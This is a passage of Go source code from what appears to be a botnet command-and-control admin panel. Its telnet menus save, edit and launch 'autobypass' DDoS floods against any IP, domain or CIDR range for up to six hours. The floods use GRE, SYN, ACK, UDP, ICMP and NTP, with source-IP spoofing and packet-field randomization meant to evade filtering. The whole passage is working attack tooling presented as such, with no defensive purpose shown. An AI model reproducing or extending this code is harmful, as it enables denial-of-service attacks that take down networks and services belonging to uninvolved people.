	this.conn.Write([]byte("\r\n\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              LAUNCH ATTACK                                     \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
	this.conn.Write([]byte("\x1b[1;36mTarget IP/Domain: \x1b[0m"))
	this.conn.Write([]byte("\x1b[2;37m(hint: enter IP address like 1.2.3.4, domain like example.com, or CIDR like 1.2.3.0/24)\x1b[0m\r\n"))
	target, err := this.ReadLine(false)
	if err != nil {
		return
	}
	target = strings.TrimSpace(target)
	if target == "" {
		this.conn.Write([]byte("\x1b[1;31mTarget cannot be empty\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte("\r\n\x1b[1;36mDuration (seconds, 1-21600): \x1b[0m"))
	this.conn.Write([]byte("\x1b[2;37m(hint: 60=1min, 300=5min, 600=10min, 3600=1hour, max 21600=6hours)\x1b[0m\r\n"))
	durationStr, err := this.ReadLine(false)
	if err != nil {
		return
	}
	duration, err := strconv.Atoi(strings.TrimSpace(durationStr))
	if err != nil {
		this.conn.Write([]byte("\x1b[1;31mInvalid duration\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	if duration < 1 || duration > 21600 {
		this.conn.Write([]byte("\x1b[1;31mDuration must be between 1 and 21600 seconds\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	cmdPreview := this.previewCommand(*config, target, duration)
	this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n")))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║\x1b[1;97m              COMMAND PREVIEW                                 \x1b[1;95m║\r\n")))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n")))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;33m%s\x1b[1;95m║\r\n", cmdPreview)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n")))
	this.conn.Write([]byte("\x1b[1;33m🚀 Launch attack? (y/n): \x1b[0m"))
	confirm, _ := this.ReadLine(false)
	if strings.ToLower(strings.TrimSpace(confirm)) != "y" {
		this.conn.Write([]byte("\x1b[1;33mAttack cancelled\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.launchAutobypass(*config, username, userInfo, botCount, botCatagory, target, duration)
}
func (this *Admin) listAutobypassConfigs() []string {
	if err := ensureAutobypassDir(); err != nil {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31mError: %s\r\n", err.Error())))
		return []string{}
	}
	files, err := ioutil.ReadDir(autobypassConfigDir)
	if err != nil {
		return []string{}
	}
	var configs []string
	this.conn.Write([]byte("\r\n\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              SAVED CONFIGURATIONS                              \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	if len(files) == 0 {
		this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mNo configurations found                                    \x1b[1;95m║\r\n"))
	} else {
		for i, file := range files {
			if strings.HasSuffix(file.Name(), ".txt") {
				name := strings.TrimSuffix(file.Name(), ".txt")
				configs = append(configs, name)
				config := this.readAutobypassConfig(name)
				if config != nil {
					protoStr := strings.Join(config.Protocols, ", ")
					if len(protoStr) > 30 {
						protoStr = protoStr[:27] + "..."
					}
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36m%d\x1b[0m - \x1b[1;33m%-20s\x1b[0m \x1b[1;36m%s\x1b[0m\r\n",
						i+1, name, protoStr)))
				} else {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36m%d\x1b[0m - \x1b[1;33m%s\x1b[0m\r\n", i+1, name)))
				}
			}
		}
	}
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n"))
	return configs
}
func (this *Admin) readAutobypassConfig(name string) *AutobypassConfig {
	if err := ensureAutobypassDir(); err != nil {
		return nil
	}
	filePath := filepath.Join(autobypassConfigDir, name+".txt")
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		return nil
	}
	config := &AutobypassConfig{
		Name: name,
		UseRawSocket: false,
		SendBufferSize: 4194304,
		SourceIPMode: "real",
		IPIDMode: "random",
		TCPMSS: 1460,
		TCPWindowSize: 65535,
		SeqRandomize: true,
		AckRandomize: true,
		BurstSize: 100,
		PayloadMode: "random",
		PayloadRepeat: 1,
		OSFingerprint: "random",
		TTLMin: 64,
		TTLMax: 64,
		PortMin: 80,
		PortMax: 80,
	}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := strings.TrimSpace(parts[0])
		value := strings.TrimSpace(parts[1])
		switch key {
		case "name":
			config.Name = value
		case "protocols":
			config.Protocols = strings.Split(value, ",")
			for i := range config.Protocols {
				config.Protocols[i] = strings.TrimSpace(config.Protocols[i])
			}
		case "port":
			if p, err := strconv.Atoi(value); err == nil {
				config.Port = p
			}
		case "threads":
			if t, err := strconv.Atoi(value); err == nil {
				config.Threads = t
			}
		case "size":
			if s, err := strconv.Atoi(value); err == nil {
				config.Size = s
			}
		case "ttl":
			if t, err := strconv.Atoi(value); err == nil {
				config.TTL = t
			}
		case "tos":
			if t, err := strconv.Atoi(value); err == nil {
				config.TOS = t
			}
		case "rawsocket":
			if b, err := strconv.ParseBool(value); err == nil {
				config.UseRawSocket = b
			}
		case "binddev":
			config.BindToDevice = value
		case "sndbuf":
			if s, err := strconv.Atoi(value); err == nil {
				config.SendBufferSize = s
			}
		case "srcmode":
			config.SourceIPMode = value
		case "srcstart":
			config.SourceIPStart = value
		case "srcend":
			config.SourceIPEnd = value
		case "ipidmode":
			config.IPIDMode = value
		case "df":
			if b, err := strconv.ParseBool(value); err == nil {
				config.DFFlag = b
			}
		case "mf":
			if b, err := strconv.ParseBool(value); err == nil {
				config.MoreFragments = b
			}
		case "fragoff":
			if f, err := strconv.Atoi(value); err == nil {
				config.FragmentOffset = f
			}
		case "mss":
			if m, err := strconv.Atoi(value); err == nil {
				config.TCPMSS = m
			}
		case "win":
			if w, err := strconv.Atoi(value); err == nil {
				config.TCPWindowSize = w
			}
		case "wscale":
			if w, err := strconv.Atoi(value); err == nil {
				config.TCPWindowScale = w
			}
		case "sack":
			if b, err := strconv.ParseBool(value); err == nil {
				config.TCPSACK = b
			}
		case "ts":
			if b, err := strconv.ParseBool(value); err == nil {
				config.TCPTimestamps = b
			}
		case "nop":
			if n, err := strconv.Atoi(value); err == nil {
				config.TCPNOP = n
			}
		case "sport":
			if s, err := strconv.Atoi(value); err == nil {
				config.UDPSourcePort = s
			}
		case "seqrand":
			if b, err := strconv.ParseBool(value); err == nil {
				config.SeqRandomize = b
			}
		case "ackrand":
			if b, err := strconv.ParseBool(value); err == nil {
				config.AckRandomize = b
			}
		case "pps":
			if p, err := strconv.Atoi(value); err == nil {
				config.PPS = p
			}
		case "bps":
			if b, err := strconv.Atoi(value); err == nil {
				config.BPS = b
			}
		case "burst":
			if b, err := strconv.Atoi(value); err == nil {
				config.BurstSize = b
			}
		case "payloadmode":
			config.PayloadMode = value
		case "payloadpat":
			config.PayloadPattern = value
		case "payloadrepeat":
			if r, err := strconv.Atoi(value); err == nil {
				config.PayloadRepeat = r
			}
		case "osfp":
			config.OSFingerprint = value
		case "ttlrand":
			if b, err := strconv.ParseBool(value); err == nil {
				config.TTLRandomize = b
			}
		case "ttlmin":
			if t, err := strconv.Atoi(value); err == nil {
				config.TTLMin = t
			}
		case "ttlmax":
			if t, err := strconv.Atoi(value); err == nil {
				config.TTLMax = t
			}
		case "portrand":
			if b, err := strconv.ParseBool(value); err == nil {
				config.PortRandomize = b
			}
		case "portmin":
			if p, err := strconv.Atoi(value); err == nil {
				config.PortMin = p
			}
		case "portmax":
			if p, err := strconv.Atoi(value); err == nil {
				config.PortMax = p
			}
		case "tcpflags":
			config.TCPFlagsCustom = value
		case "tcpflagsmode":
			config.TCPFlagsMode = value
		case "ipdelay":
			if d, err := strconv.Atoi(value); err == nil {
				config.InterPacketDelay = d
			}
		case "jitter":
			if j, err := strconv.Atoi(value); err == nil {
				config.Jitter = j
			}
		case "packetorder":
			config.PacketOrdering = value
		case "burstpat":
			config.BurstPattern = value
		case "sizerand":
			if b, err := strconv.ParseBool(value); err == nil {
				config.SizeRandomize = b
			}
		case "sizemin":
			if s, err := strconv.Atoi(value); err == nil {
				config.SizeMin = s
			}
		case "sizemax":
			if s, err := strconv.Atoi(value); err == nil {
				config.SizeMax = s
			}
		case "sportrand":
			if b, err := strconv.ParseBool(value); err == nil {
				config.SourcePortRandomize = b
			}
		case "sportmin":
			if p, err := strconv.Atoi(value); err == nil {
				config.SourcePortMin = p
			}
		case "sportmax":
			if p, err := strconv.Atoi(value); err == nil {
				config.SourcePortMax = p
			}
		case "seqpat":
			config.SeqPattern = value
		case "ackpat":
			config.AckPattern = value
		case "seqinc":
			if i, err := strconv.Atoi(value); err == nil {
				config.SeqIncrement = i
			}
		case "ackinc":
			if i, err := strconv.Atoi(value); err == nil {
				config.AckIncrement = i
			}
		case "ipprec":
			if p, err := strconv.Atoi(value); err == nil {
				config.IPPrecedence = p
			}
		case "dscp":
			if d, err := strconv.Atoi(value); err == nil {
				config.DSCP = d
			}
		case "ecn":
			if b, err := strconv.ParseBool(value); err == nil {
				config.ECN = b
			}
		case "urgptr":
			if u, err := strconv.Atoi(value); err == nil {
				config.TCPUrgentPtr = u
			}
		case "winrand":
			if b, err := strconv.ParseBool(value); err == nil {
				config.WindowRandomize = b
			}
		case "winmin":
			if w, err := strconv.Atoi(value); err == nil {
				config.WindowMin = w
			}
		case "winmax":
			if w, err := strconv.Atoi(value); err == nil {
				config.WindowMax = w
			}
		case "mssrand":
			if b, err := strconv.ParseBool(value); err == nil {
				config.MSSRandomize = b
			}
		case "mssmin":
			if m, err := strconv.Atoi(value); err == nil {
				config.MSSMin = m
			}
		case "mssmax":
			if m, err := strconv.Atoi(value); err == nil {
				config.MSSMax = m
			}
		case "keepalive":
			if b, err := strconv.ParseBool(value); err == nil {
				config.Keepalive = b
			}
		case "keepint":
			if k, err := strconv.Atoi(value); err == nil {
				config.KeepaliveInterval = k
			}
		case "retry":
			if r, err := strconv.Atoi(value); err == nil {
				config.RetryCount = r
			}
		case "timeout":
			if t, err := strconv.Atoi(value); err == nil {
				config.ConnectionTimeout = t
			}
		case "congestion":
			config.CongestionControl = value
		case "created":
			if t, err := time.Parse(time.RFC3339, value); err == nil {
				config.Created = t
			}
		}
	}
	if len(config.Protocols) == 0 {
		config.Protocols = []string{"all"}
	}
	return config
}
func (this *Admin) viewAutobypassConfig() {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              VIEW AUTOBYPASS CONFIGURATION                    \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
	configs := this.listAutobypassConfigs()
	if len(configs) == 0 {
		this.conn.Write([]byte("\x1b[1;31mNo configurations found\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte("\x1b[1;36mEnter configuration name or number: \x1b[0m"))
	nameOrNum, err := this.ReadLine(false)
	if err != nil {
		return
	}
	var config *AutobypassConfig
	nameOrNum = strings.TrimSpace(nameOrNum)
	if num, err := strconv.Atoi(nameOrNum); err == nil && num > 0 && num <= len(configs) {
		config = this.readAutobypassConfig(configs[num-1])
	} else {
		config = this.readAutobypassConfig(nameOrNum)
	}
	if config == nil {
		this.conn.Write([]byte("\x1b[1;31mConfiguration not found\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n")))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║\x1b[1;97m              CONFIGURATION DETAILS                              \x1b[1;95m║\r\n")))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n")))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mName:      \x1b[1;33m%-50s\x1b[1;95m║\r\n", config.Name)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mProtocols: \x1b[1;33m%-50s\x1b[1;95m║\r\n", strings.Join(config.Protocols, ", "))))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mPort:      \x1b[1;33m%-50d\x1b[1;95m║\r\n", config.Port)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mThreads:   \x1b[1;33m%-50d\x1b[1;95m║\r\n", config.Threads)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mSize:      \x1b[1;33m%-50d\x1b[1;95m║\r\n", config.Size)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mTTL:       \x1b[1;33m%-50d\x1b[1;95m║\r\n", config.TTL)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mTOS:       \x1b[1;33m%-50d\x1b[1;95m║\r\n", config.TOS)))
	if !config.Created.IsZero() {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mCreated:   \x1b[1;33m%-50s\x1b[1;95m║\r\n", config.Created.Format("2006-01-02 15:04:05"))))
	}
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n")))
	this.conn.Write([]byte("\r\n\x1b[1;33mPress Enter to continue...\x1b[0m"))
	this.ReadLine(false)
}
func (this *Admin) copyAutobypassConfig() {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              COPY AUTOBYPASS CONFIGURATION                    \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
	configs := this.listAutobypassConfigs()
	if len(configs) == 0 {
		this.conn.Write([]byte("\x1b[1;31mNo configurations found\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte("\x1b[1;36mEnter source configuration name or number: \x1b[0m"))
	nameOrNum, err := this.ReadLine(false)
	if err != nil {
		return
	}
	var sourceConfig *AutobypassConfig
	nameOrNum = strings.TrimSpace(nameOrNum)
	if num, err := strconv.Atoi(nameOrNum); err == nil && num > 0 && num <= len(configs) {
		sourceConfig = this.readAutobypassConfig(configs[num-1])
	} else {
		sourceConfig = this.readAutobypassConfig(nameOrNum)
	}
	if sourceConfig == nil {
		this.conn.Write([]byte("\x1b[1;31mConfiguration not found\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte("\x1b[1;36mEnter new configuration name: \x1b[0m"))
	newName, err := this.ReadLine(false)
	if err != nil {
		return
	}
	newName = strings.TrimSpace(newName)
	if newName == "" {
		this.conn.Write([]byte("\x1b[1;31mInvalid name\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	if this.readAutobypassConfig(newName) != nil {
		this.conn.Write([]byte("\x1b[1;31mConfiguration with this name already exists\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	newConfig := *sourceConfig
	newConfig.Name = newName
	newConfig.Created = time.Now()
	if err := this.saveAutobypassConfig(newConfig); err != nil {
		this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;31mError copying configuration: %s\r\n", err.Error())))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;32mConfiguration '%s' copied to '%s'!\r\n", sourceConfig.Name, newName)))
	time.Sleep(2 * time.Second)
}
func (this *Admin) editAutobypassConfig(username string, userInfo AccountInfo, botCount int, botCatagory string) {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              EDIT AUTOBYPASS CONFIGURATION                    \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
	configs := this.listAutobypassConfigs()
	if len(configs) == 0 {
		this.conn.Write([]byte("\x1b[1;31mNo configurations found\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte("\x1b[1;36mEnter configuration name or number to edit: \x1b[0m"))
	nameOrNum, err := this.ReadLine(false)
	if err != nil {
		return
	}
	var config *AutobypassConfig
	nameOrNum = strings.TrimSpace(nameOrNum)
	if num, err := strconv.Atoi(nameOrNum); err == nil && num > 0 && num <= len(configs) {
		config = this.readAutobypassConfig(configs[num-1])
	} else {
		config = this.readAutobypassConfig(nameOrNum)
	}
	if config == nil {
		this.conn.Write([]byte("\x1b[1;31mConfiguration not found\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;32mEditing configuration '%s'\r\n", config.Name)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mCurrent protocols: %s\r\n", strings.Join(config.Protocols, ", "))))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mCurrent settings: Port=%d Threads=%d Size=%d TTL=%d TOS=%d\r\n",
		config.Port, config.Threads, config.Size, config.TTL, config.TOS)))
	this.conn.Write([]byte("\r\n\x1b[1;33mEdit protocols? (y/n): \x1b[0m"))
	editProto, _ := this.ReadLine(false)
	if strings.ToLower(strings.TrimSpace(editProto)) == "y" {
		protocolMap := map[string]string{
			"1": "greip", "2": "greeth", "3": "tcpsyn", "4": "tcpack",
			"5": "tcpall", "6": "udp", "7": "tcp", "8": "tcpfrag",
			"9": "tcpbypass", "a": "ice", "b": "icmp", "c": "ntp",
		}
		selected := make(map[string]bool)
		for _, proto := range config.Protocols {
			if proto != "all" {
				selected[proto] = true
			}
		}
		if len(config.Protocols) == 1 && config.Protocols[0] == "all" {
			for _, proto := range protocolMap {
				selected[proto] = true
			}
		}
		for {
			this.showProtocolSelection(selected, protocolMap)
			this.conn.Write([]byte("\x1b[1;33mSelect protocol (or 'done' to finish): \x1b[0m"))
			choice, err := this.ReadLine(false)
			if err != nil {
				return
			}
			choice = strings.ToLower(strings.TrimSpace(choice))
			if choice == "done" {
				break
			}
			if choice == "*" {
				for _, proto := range protocolMap {
					selected[proto] = true
				}
				break
			}
			if proto, ok := protocolMap[choice]; ok {
				selected[proto] = !selected[proto]
			}
		}
		config.Protocols = []string{}
		for proto, enabled := range selected {
			if enabled {
				config.Protocols = append(config.Protocols, proto)
			}
		}
		if len(config.Protocols) == 0 {
			config.Protocols = []string{"all"}
		}
	}
	this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;36mPort (current %d, press Enter to keep): \x1b[0m", config.Port)))
	portStr, _ := this.ReadLine(false)
	if portStr != "" {
		if p, err := strconv.Atoi(strings.TrimSpace(portStr)); err == nil && p > 0 && p < 65536 {
			config.Port = p
		}
	}
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mThreads (current %d, press Enter to keep): \x1b[0m", config.Threads)))
	threadsStr, _ := this.ReadLine(false)
	if threadsStr != "" {
		if t, err := strconv.Atoi(strings.TrimSpace(threadsStr)); err == nil && t > 0 {
			config.Threads = t
		}
	}
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mPacket size (current %d, press Enter to keep): \x1b[0m", config.Size)))
	sizeStr, _ := this.ReadLine(false)
	if sizeStr != "" {
		if s, err := strconv.Atoi(strings.TrimSpace(sizeStr)); err == nil && s > 0 {
			config.Size = s
		}
	}
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mTTL (current %d, press Enter to keep): \x1b[0m", config.TTL)))
	ttlStr, _ := this.ReadLine(false)
	if ttlStr != "" {
		if t, err := strconv.Atoi(strings.TrimSpace(ttlStr)); err == nil && t > 0 && t < 256 {
			config.TTL = t
		}
	}
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mTOS (current %d, press Enter to keep): \x1b[0m", config.TOS)))
	tosStr, _ := this.ReadLine(false)
	if tosStr != "" {
		if t, err := strconv.Atoi(strings.TrimSpace(tosStr)); err == nil && t >= 0 && t < 256 {
			config.TOS = t
		}
	}
	if err := this.saveAutobypassConfig(*config); err != nil {
		this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;31mError updating configuration: %s\r\n", err.Error())))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;32mConfiguration '%s' updated!\r\n", config.Name)))
	time.Sleep(2 * time.Second)
}
func (this *Admin) deleteAutobypassConfig() {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              DELETE AUTOBYPASS CONFIGURATION                 \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
	configs := this.listAutobypassConfigs()
	if len(configs) == 0 {
		this.conn.Write([]byte("\x1b[1;31mNo configurations found\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte("\x1b[1;36mEnter configuration name or number to delete: \x1b[0m"))
	nameOrNum, err := this.ReadLine(false)
	if err != nil {
		return
	}
	var name string
	nameOrNum = strings.TrimSpace(nameOrNum)
	if num, err := strconv.Atoi(nameOrNum); err == nil && num > 0 && num <= len(configs) {
		name = configs[num-1]
	} else {
		name = nameOrNum
	}
	config := this.readAutobypassConfig(name)
	if config == nil {
		this.conn.Write([]byte("\x1b[1;31mConfiguration not found\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;33mAre you sure you want to delete '%s'? (yes/no): \x1b[0m", name)))
	confirm, err := this.ReadLine(false)
	if err != nil {
		return
	}
	if strings.ToLower(strings.TrimSpace(confirm)) == "yes" {
		if err := ensureAutobypassDir(); err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31mError: %s\r\n", err.Error())))
			time.Sleep(2 * time.Second)
			return
		}
		filePath := filepath.Join(autobypassConfigDir, name+".txt")
		err := os.Remove(filePath)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31mError deleting configuration: %s\r\n", err.Error())))
		} else {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32mConfiguration '%s' deleted!\r\n", name)))
		}
	} else {
		this.conn.Write([]byte("\x1b[1;33mDeletion cancelled\r\n"))
	}
	time.Sleep(2 * time.Second)
}
func (this *Admin) quickLaunchAutobypass(username string, userInfo AccountInfo, botCount int, botCatagory string) {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              QUICK LAUNCH AUTOBYPASS                          \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
	this.conn.Write([]byte("\x1b[1;33mEnter target: \x1b[0m"))
	target, err := this.ReadLine(false)
	if err != nil {
		return
	}
	this.conn.Write([]byte("\x1b[1;33mEnter duration (seconds): \x1b[0m"))
	durationStr, err := this.ReadLine(false)
	if err != nil {
		return
	}
	duration, err := strconv.Atoi(strings.TrimSpace(durationStr))
	if err != nil {
		this.conn.Write([]byte("\x1b[1;31mInvalid duration\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	config := AutobypassConfig{
		Protocols: []string{"all"},
		Port:      80,
		Threads:   128,
		Size:      512,
		TTL:       64,
		TOS:       0,
		UseRawSocket: false,
		SendBufferSize: 4194304,
		SourceIPMode: "real",
		IPIDMode: "random",
		TCPMSS: 1460,
		TCPWindowSize: 65535,
		SeqRandomize: true,
		AckRandomize: true,
		BurstSize: 100,
		PayloadMode: "random",
		PayloadRepeat: 1,
		OSFingerprint: "random",
		TTLMin: 64,
		TTLMax: 64,
		PortMin: 80,
		PortMax: 80,
	}
	cmdPreview := this.previewCommand(config, strings.TrimSpace(target), duration)
	this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;36mCommand preview:\r\n\x1b[1;33m%s\r\n\r\n", cmdPreview)))
	this.conn.Write([]byte("\x1b[1;33mLaunch attack? (y/n): \x1b[0m"))
	confirm, _ := this.ReadLine(false)
	if strings.ToLower(strings.TrimSpace(confirm)) != "y" {
		this.conn.Write([]byte("\x1b[1;33mCancelled\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.launchAutobypass(config, username, userInfo, botCount, botCatagory, strings.TrimSpace(target), duration)
}
func (this *Admin) launchAutobypass(config AutobypassConfig, username string, userInfo AccountInfo, botCount int, botCatagory string, target string, duration int) {
	protocolsStr := strings.Join(config.Protocols, ",")
	if len(config.Protocols) == 0 || (len(config.Protocols) == 1 && config.Protocols[0] == "all") {
		protocolsStr = "all"
	}
	if duration <= 0 || duration > 21600 {
		this.conn.Write([]byte("\x1b[1;31mInvalid duration (must be 1-21600 seconds)\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	if config.Port <= 0 || config.Port >= 65536 {
		this.conn.Write([]byte("\x1b[1;31mInvalid port (must be 1-65535)\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	cmd := fmt.Sprintf("autobypass %s %d port=%d threads=%d size=%d ttl=%d tos=%d protocols=%s",
		target, duration, config.Port, config.Threads, config.Size, config.TTL, config.TOS, protocolsStr)
	if config.UseRawSocket {
		cmd += " rawsocket=1"
	}
	if config.BindToDevice != "" {
		cmd += fmt.Sprintf(" binddev=%s", config.BindToDevice)
	}
	if config.SendBufferSize != 4194304 {
		cmd += fmt.Sprintf(" sndbuf=%d", config.SendBufferSize)
	}
	if config.SourceIPMode != "real" {
		cmd += fmt.Sprintf(" srcmode=%s", config.SourceIPMode)
		if config.SourceIPStart != "" {
			cmd += fmt.Sprintf(" srcstart=%s", config.SourceIPStart)
		}
		if config.SourceIPEnd != "" {
			cmd += fmt.Sprintf(" srcend=%s", config.SourceIPEnd)
		}
	}
	if config.IPIDMode != "random" {
		cmd += fmt.Sprintf(" ipidmode=%s", config.IPIDMode)
	}
	if config.DFFlag {
		cmd += " df=1"
	}
	if config.MoreFragments {
		cmd += " mf=1"
	}
	if config.FragmentOffset > 0 {
		cmd += fmt.Sprintf(" fragoff=%d", config.FragmentOffset)
	}
	if config.TCPMSS != 1460 {
		cmd += fmt.Sprintf(" mss=%d", config.TCPMSS)
	}
	if config.TCPWindowSize != 65535 {
		cmd += fmt.Sprintf(" win=%d", config.TCPWindowSize)
	}
	if config.TCPWindowScale > 0 {
		cmd += fmt.Sprintf(" wscale=%d", config.TCPWindowScale)
	}
	if config.TCPSACK {
		cmd += " sack=1"
	}
	if config.TCPTimestamps {
		cmd += " ts=1"
	}
	if config.TCPNOP > 0 {
		cmd += fmt.Sprintf(" nop=%d", config.TCPNOP)
	}
	if config.UDPSourcePort > 0 {
		cmd += fmt.Sprintf(" sport=%d", config.UDPSourcePort)
	}
	if !config.SeqRandomize {
		cmd += " seqrand=0"
	}
	if !config.AckRandomize {
		cmd += " ackrand=0"
	}
	if config.PPS > 0 {
		cmd += fmt.Sprintf(" pps=%d", config.PPS)
	}
	if config.BPS > 0 {
		cmd += fmt.Sprintf(" bps=%d", config.BPS)
	}
	if config.BurstSize != 100 {
		cmd += fmt.Sprintf(" burst=%d", config.BurstSize)
	}
	if config.PayloadMode != "random" {
		cmd += fmt.Sprintf(" payloadmode=%s", config.PayloadMode)
		if config.PayloadPattern != "" {
			cmd += fmt.Sprintf(" payloadpat=%s", config.PayloadPattern)
		}
		if config.PayloadRepeat > 1 {
			cmd += fmt.Sprintf(" repeat=%d", config.PayloadRepeat)
		}
	}
	if config.OSFingerprint != "random" {
		cmd += fmt.Sprintf(" osfp=%s", config.OSFingerprint)
	}
	if config.TTLRandomize {
		cmd += " ttlrand=1"
		if config.TTLMin != config.TTLMax {
			cmd += fmt.Sprintf(" ttlmin=%d ttlmax=%d", config.TTLMin, config.TTLMax)
		}
	}
	if config.PortRandomize {
		cmd += " portrand=1"
		if config.PortMin != config.PortMax {
			cmd += fmt.Sprintf(" portmin=%d portmax=%d", config.PortMin, config.PortMax)
		}
	}
	if config.TCPFlagsMode != "random" {
		cmd += fmt.Sprintf(" tcpflagsmode=%s", config.TCPFlagsMode)
		if config.TCPFlagsCustom != "" {
			cmd += fmt.Sprintf(" tcpflags=%s", config.TCPFlagsCustom)
		}
	}
	if config.InterPacketDelay > 0 {
		cmd += fmt.Sprintf(" ipdelay=%d", config.InterPacketDelay)
	}
	if config.Jitter > 0 {
		cmd += fmt.Sprintf(" jitter=%d", config.Jitter)
	}
	if config.PacketOrdering != "sequential" {
